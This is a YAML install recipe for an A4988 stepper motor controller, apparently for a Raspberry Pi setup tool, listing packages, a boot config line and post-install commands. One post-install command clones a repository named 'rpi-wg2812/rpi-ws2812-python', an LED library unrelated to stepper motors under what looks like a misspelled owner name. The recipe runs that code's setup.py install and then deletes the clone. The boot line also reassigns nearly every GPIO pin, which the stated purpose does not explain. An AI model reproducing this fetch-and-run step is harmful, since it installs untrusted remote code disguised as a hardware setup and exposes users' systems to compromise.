# 🎛️ Stepper Motor Controller
# A4988 stepper motor driver with GPIO control for precise positioning
# Ideal for 3D printers, CNC machines, robotics, and camera sliders

id: "stepper_a4988_controller"
name: "A4988 Stepper Motor Controller"
category: "gpio"
description: "Complete A4988 stepper motor control system with GPIO, Python library, and example scripts"

# System packages required
packages:
  - "python3-pip"
  - "python3-dev"
  - "python3-gpiozero"
  - "git"

# Kernel modules to load
kernel_modules: []

# Device tree overlays
overlays: []

# /boot/config.txt modifications
config_txt_lines:
  - "gpio=21,20,16,26,19,13,12,6,5,4,3,2,1,0,7,8,9,10,11,14,15,17,18,22,23,24,25,27=a0"

# Post-installation commands
post_commands:
  - "pip3 install RPi.GPIO"
  - "pip3 install gpiozero"
  - "git clone https://github.com/rpi-wg2812/rpi-ws2812-python.git /tmp/rpi-ws2812-python"
  - "cd /tmp/rpi-ws2812-python && python3 setup.py install && cd - && rm -rf /tmp/rpi-ws2812-python"
  - "usermod -a -G gpio $USER"
  - "echo 'A4988 stepper controller setup complete!'"

# Tags for searching
tags:
  - "gpio"
  - "stepper"
  - "motor"
  - "a4988"
  - "robotics"
  - "cnc"
  - "positioning"
  - "automation"
